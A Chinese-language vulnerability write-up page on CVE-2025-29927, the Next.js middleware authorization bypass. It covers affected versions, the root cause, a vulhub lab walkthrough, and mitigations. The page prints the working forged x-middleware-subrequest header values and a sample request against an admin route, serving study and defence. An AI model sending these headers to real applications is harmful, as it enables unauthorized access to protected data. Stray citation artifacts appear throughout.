<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/1023.ico" type="image/x-icon">
    <title>CVE-2025-29927 - Next.js中间件授权绕过漏洞</title>
    <style>
        /* 全局样式 */
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #0f0;
            font-family: 'Consolas', monospace;
            overflow-x: hidden;
            position: relative;
        }

        /* 矩阵背景 */
        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            z-index: 0;
        }

        /* 导航栏样式 */
        nav {
            position: relative;
            background: rgba(0, 20, 0, 0.95);
            padding: 1rem;
            border-bottom: 1px solid #0f0;
            transition: transform 0.3s ease;
        }

        nav a {
            color: #0f0;
            text-decoration: none;
            margin: 0 1.5rem;
            font-family: 'Consolas', monospace;
        }

        /* 内容容器 */
        .container {
            position: relative;
            z-index: 1;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.85);
            border: 1px solid #0f03;
            min-height: 100vh;
        }
        
        /* 标题样式 */
        h2, h3 {
            color: #0f0;
            border-bottom: 1px solid #0f0;
            padding-bottom: 10px;
        }
        
        .glow {
            text-shadow: 0 0 5px #0f0;
        }
        
        pre {
            background-color: #001100;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            border: 1px solid #0f0;
        }
        
        ul, ol {
            padding-left: 20px;
        }
        
        li {
            margin-bottom: 10px;
        }
        
        .warning {
            color: #ff0;
            font-weight: bold;
        }
        
        .impact-box {
            border: 1px solid #f00;
            padding: 15px;
            margin: 20px 0;
            background: rgba(50, 0, 0, 0.5);
        }
    </style>
</head>
<body>
    <!-- 矩阵背景画布 -->
    <canvas id="matrix"></canvas>
    
    <!-- 导航栏 -->
    <nav id="mainNav">
        <a href="/index.html" class="glow">首页</a>
        <a href="/GH/gh.html" class="glow">返回漏洞库</a>
        <a href="#" class="glow">Next.js中间件授权绕过漏洞</a>
    </nav>
    
    <div class="container">
        <div class="post-list">
            <h2>CVE-2025-29927 Next.js中间件授权绕过漏洞</h2>
            <div class="post-item"> 
                <div class="post-item-content">
                    <h3 class="glow">■ 漏洞详情</h3>
                    <p><strong>漏洞名称：</strong>Next.js中间件授权绕过漏洞</p>
                    <p><strong>CVE编号：</strong>CVE-2025-29927</p>
                    <p><strong>威胁等级：</strong>严重（CVSS 9.1）:cite[1]:cite[10]</p>
                    <p><strong>披露日期：</strong>2025年3月21日</p>
                    
                    <div class="impact-box">
                        <p class="warning">高危警告：攻击者无需身份验证即可利用此漏洞，直接访问受保护路由和敏感数据！</p>
                    </div>
                    
                    <p><strong>影响版本：</strong></p>
                    <ul>
                        <li>Next.js 11.1.4 - 13.5.6:cite[3]:cite[9]</li>
                        <li>Next.js 14.0.0 - 14.2.24:cite[2]:cite[5]</li>
                        <li>Next.js 15.0.0 - 15.2.2:cite[6]:cite[7]</li>
                    </ul>
                    
                    <p><strong>安全修复版本：</strong></p>
                    <ul>
                        <li>Next.js 15.2.3+</li>
                        <li>Next.js 14.2.25+</li>
                        <li>Next.js 13.5.9+</li>
                        <li>Next.js 12.3.5+:cite[3]:cite[7]</li>
                    </ul>

                    <h3 class="glow">■ 技术原理</h3>
                    <p>Next.js框架使用中间件处理HTTP请求，执行身份验证、授权和安全标头设置等关键任务:cite[1]。该漏洞的核心问题在于：</p>
                    <ul>
                        <li>Next.js使用内部标头<code>x-middleware-subrequest</code>防止中间件递归请求导致的无限循环:cite[1]:cite[6]</li>
                        <li>该标头的值基于中间件文件的路径且可预测（如<code>middleware</code>或<code>src/middleware</code>）:cite[1]</li>
                        <li>攻击者可以伪造此标头值，欺骗Next.js框架将外部请求识别为内部子请求:cite[3]</li>
                        <li>导致中间件安全机制被完全绕过，身份验证和授权检查失效:cite[4]:cite[9]</li>
                    </ul>
                    
                    <p><strong>漏洞代码示例：</strong></p>
                    <pre>const run = withTaggedErrors(async function runWithTaggedErrors(params) {
  const subreq = params.request.headers[`x-middleware-subrequest`];
  const subrequests = typeof subreq === 'string' ? subreq.split(':') : [];
  const depth = subrequests.reduce((acc, curr) => 
    curr === params.name ? acc + 1 : acc, 0);
  
  // 当depth≥5时直接返回，跳过安全检查
  if (depth >= MAX_RECURSION_DEPTH) {
    return {
      response: new Response(null, { headers: { 'x-middleware-next': '1' } })
    };
  }
  // ...后续安全检查代码被跳过?不可能
}:cite[6]
这里用vulhub工具
先进入vulhub的目录
...(你的位置)/vulhub/next.js/CVE-2025-29927
docker compose up -d
如果报错Error response from daemon: Get "https://registry-1.docker.io/v2/": context deadline exceeded，执行以下步骤
创建systemd配置文件
sudo mkdir -p /etc/systemd/system/docker.service.d
sudo vim /etc/systemd/system/docker.service.d/http-proxy.conf
写入            
[Service]
Environment="HTTP_PROXY=http://192.168.3.3:1145"（192.168.3.3换为物理机地址,1145换成代理地址，下面一样)
Environment="HTTPS_PROXY=http://192.168.3.3:1145"
Environment="NO_PROXY=localhost,127.0.0.1,.example.com"
重新执行docker compose up -d
拉取完成后就可以关闭代理了
然后用浏览器访问端口，就可以进入攻击目标的后台表盘，不建议爆破
浏览器打开F12，再URL中输入端口号，MODIFY HEADER添加请求头x-middleware-subrequest，值：middleware:middleware:middleware:middleware:middleware
点击EXECUTE，进入仪表盘，恭喜你成功了
</pre>
                    <h3 class="glow">■ 漏洞利用方式</h3>
                    <p>攻击者通过构造特定HTTP请求头绕过安全控制：</p>
                    
                    <p><strong>漏洞利用请求示例：</strong></p>
                    <pre>GET /admin/dashboard HTTP/1.1
Host: vulnerable-app.com
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
Connection: close:cite[3]:cite[6]</pre>
                    
                    <p><strong>攻击流程：</strong></p>
                    <ol>
                        <li>识别目标Next.js应用（版本在受影响范围内）</li>
                        <li>确定受保护路由（如/admin, /api敏感接口）</li>
                        <li>构造恶意请求，添加伪造的<code>x-middleware-subrequest</code>标头</li>
                        <li>针对不同版本使用不同payload：
                            <ul>
                                <li>旧版本：<code>pages/_middleware</code></li>
                                <li>新版本：<code>src/middleware:middleware:middleware</code>:cite[3]</li>
                            </ul>
                        </li>
                        <li>发送请求直接访问受保护资源，无需身份验证</li>
                    </ol>
                    
                    <p><strong>潜在危害：</strong></p>
                    <ul>
                        <li>未授权访问敏感数据和用户信息</li>
                        <li>绕过管理控制台安全防护</li>
                        <li>禁用安全标头（如CSP、HSTS）:cite[3]</li>
                        <li>破坏路径重写(rewrite)逻辑</li>
                    </ul>

                    <h3 class="glow">■ 防御措施</h3>
                    <p><strong>根本解决方案：</strong></p>
                    <ul>
                        <li>立即升级到安全版本：
                            <pre>npm install next@15.2.3  # 针对Next.js 15.x
npm install next@14.2.25  # 针对Next.js 14.x:cite[3]:cite[5]</pre>
                        </li>
                    </ul>
                    
                    <p><strong>临时缓解方案：</strong></p>
                    <ul>
                        <li>在反向代理层（Nginx）移除恶意标头：
                            <pre># Nginx配置
location / {
    proxy_set_header x-middleware-subrequest "";
    # 其他代理配置...
}:cite[2]:cite[9]</pre>
                        </li>
                        <li>在中间件入口添加标头检测：
                            <pre>// middleware.js
export function middleware(request: NextRequest) {
  if (request.headers.has('x-middleware-subrequest')) {
    return new Response('Unauthorized', { status: 401 });
  }
  return NextResponse.next();
}:cite[4]</pre>
                        </li>
                        <li>实现纵深防御，在API路由和页面层重复权限校验:cite[3]</li>
                    </ul>
                    
                    <p><strong>强化防护：</strong></p>
                    <ul>
                        <li>使用WAF规则拦截恶意请求（如Akamai规则ID 3000958）:cite[1]</li>
                        <li>部署请求日志分析，监控异常标头使用:cite[4]</li>
                        <li>定期进行安全审计和渗透测试</li>
                    </ul>
                    
                    <h3 class="glow">■ 受影响与不受影响环境</h3>
                    <p><strong>受影响环境：</strong></p>
                    <ul>
                        <li>自托管（self-hosted）Next.js应用:cite[7]</li>
                        <li>使用<code>next start</code>启动的应用:cite[8]</li>
                        <li>使用<code>output: 'standalone'</code>配置的应用:cite[7]</li>
                    </ul>
                    
                    <p><strong>不受影响环境：</strong></p>
                    <ul>
                        <li>托管在Vercel上的应用:cite[3]:cite[7]</li>
                        <li>托管在Netlify上的应用:cite[7]</li>
                        <li>静态导出部署的应用（<code>next export</code>）:cite[3]</li>
                        <li>未使用中间件的Next.js应用</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // 添加导航栏跟随滚动效果
        let lastScroll = 0;
        const nav = document.getElementById('mainNav');
        const navHeight = nav.offsetHeight;

        window.addEventListener('scroll', () => {
            const currentScroll = window.pageYOffset;
            
            if (currentScroll > lastScroll && currentScroll > navHeight) {
                // 向下滚动时隐藏导航栏
                nav.style.transform = `translateY(-${navHeight}px)`;
            } else {
                // 向上滚动时显示导航栏
                nav.style.transform = 'translateY(0)';
            }
            lastScroll = currentScroll;
        });

        // 矩阵数字雨效果
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        // 初始化画布
        function initCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            ctx.fillStyle = '#0F0';
            ctx.font = '14px monospace';
        }
        
        // 字符集和参数
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?';
        const drops = [];
        const fontSize = 14;
        let columns;

        // 初始化矩阵列
        function initDrops() {
            columns = Math.floor(canvas.width / fontSize);
            drops.length = 0;
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.random() * -canvas.height;
            }
        }

        // 绘制动画帧
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            drops.forEach((yPos, index) => {
                const text = chars[Math.floor(Math.random() * chars.length)];
                const x = index * fontSize;
                ctx.fillText(text, x, yPos);
                
                if (yPos > canvas.height && Math.random() > 0.975) {
                    drops[index] = 0;
                }
                drops[index] += fontSize;
            });
        }

        // 窗口调整事件
        let resizeTimer;
        window.addEventListener('resize', () => {
            clearTimeout(resizeTimer);
            resizeTimer = setTimeout(() => {
                initCanvas();
                initDrops();
            }, 200);
        });

        // 启动动画
        initCanvas();
        initDrops();
        setInterval(drawMatrix, 50);
    </script>
</body>
</html>
